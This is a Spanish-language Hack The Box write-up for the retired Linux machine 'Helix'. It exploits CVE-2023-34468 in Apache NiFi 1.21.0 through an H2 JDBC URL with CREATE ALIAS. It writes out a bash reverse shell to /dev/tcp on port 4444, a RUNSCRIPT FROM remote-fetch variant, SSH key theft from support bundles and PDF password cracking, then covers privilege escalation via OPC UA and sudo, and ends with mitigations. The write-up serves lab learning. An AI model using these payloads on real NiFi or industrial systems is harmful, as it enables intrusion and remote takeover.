---
machine: Helix
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-nifi, h2, ics, cve-2023-34468, opc-ua]
---

# Helix — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un flujo industrial simulado sobre **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). El canvas se sirve **sin autenticar** y el anónimo tiene `canWrite: true`, que es la misconfiguración que hace explotable la CVE. El procesador `ExecuteSQL` acepta un `DBCPConnectionPool` con la URL JDBC que le pongas: apuntándolo a un **H2** propio con `CREATE ALIAS` se ejecuta Java dentro de la JVM de NiFi (**CVE-2023-34468**, corregida en 1.22.0) y sale shell como `nifi`. Después, un backup de clave SSH en los soportes del servicio da acceso a `operator`, y la escalada llega por el servicio OPC UA interno y la consola de mantenimiento.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
```

```text
22/tcp    ssh
80/tcp    nginx
8080/tcp  Apache NiFi 1.21.0 (vhost flow.helix.htb)
```

```bash
echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
```

`/nifi-api/flow/about` confirma `"version":"1.21.0"`, la última antes del parche. El canvas carga sin login: no hay credenciales que romper.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. Crear un **Controller Service** `DBCPConnectionPool` con:

```text
Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:   org.h2.Driver
```

2. Añadir un procesador `ExecuteSQL` que use ese servicio y lanzar:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')
```

3. Arrancar el procesador y enviar un flowfile.

```bash
nc -lvnp 4444
```

```text
nifi@helix:/opt/nifi-1.21.0$
```

Variante cuando el INIT no cabe en la URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, con el `CREATE ALIAS` y el `CALL` en el script.

## Movimiento lateral

```bash
ls /opt/nifi-1.21.0/support_bundles/
# operator_id_ed25519.bak
cat /opt/nifi-1.21.0/support_bundles/operator_id_ed25519.bak > /tmp/op.key
chmod 600 /tmp/op.key
ssh -i /tmp/op.key operator@<IP>
```

El *support bundle* guarda en claro la clave ed25519 de `operator`. En su home hay un `maintenance.pdf` protegido (`pdf2john` + rockyou) y un PNG con el diagrama de control: el PDF describe la ventana de mantenimiento y su contraseña es **la misma que la del OPC UA**.

## Escalada de privilegios

```bash
ss -ltnp
# 127.0.0.1:4840  OPC UA  (opc.tcp://127.0.0.1:4840/helix/)
# 127.0.0.1:8081  HMI del reactor
sudo -l
# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Hay que **tunelar** el 4840 (`ssh -L 4840:127.0.0.1:4840 operator@<IP>`) y escribir nodos del reactor: `MODE=MAINTENANCE` y `CalibrationOffset=11.0`, que lleva la temperatura a **295 °C**. El controlador de seguridad, que es quien concede la ventana (no el modo del operador), escribe entonces el fichero `maintenance_window`; sólo con ese fichero presente la consola arranca:

```bash
sudo /usr/local/sbin/helix-maint-console
```

Dentro, comandos como root.

## Evidencia

```text
/home/operator/user.txt  -> <user_flag>
/root/root.txt           -> <root_flag>
```

## Lecciones aprendidas

- Cualquier procesador que acepte una **URL JDBC** es un primitivo de RCE en Java si el driver H2 está en el classpath.
- `INIT=`, `RUNSCRIPT FROM` y `CREATE ALIAS` son la tríada clásica de H2, reciclada de Spring Boot a NiFi.
- Los backups de configuración de un servicio suelen llevar claves y secretos en claro.
- Mitigación: drivers JDBC en allowlist, sin `INIT` en URLs, NiFi sin acceso desde la red de usuarios, y `sudo` solo para acciones concretas y auditadas.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)
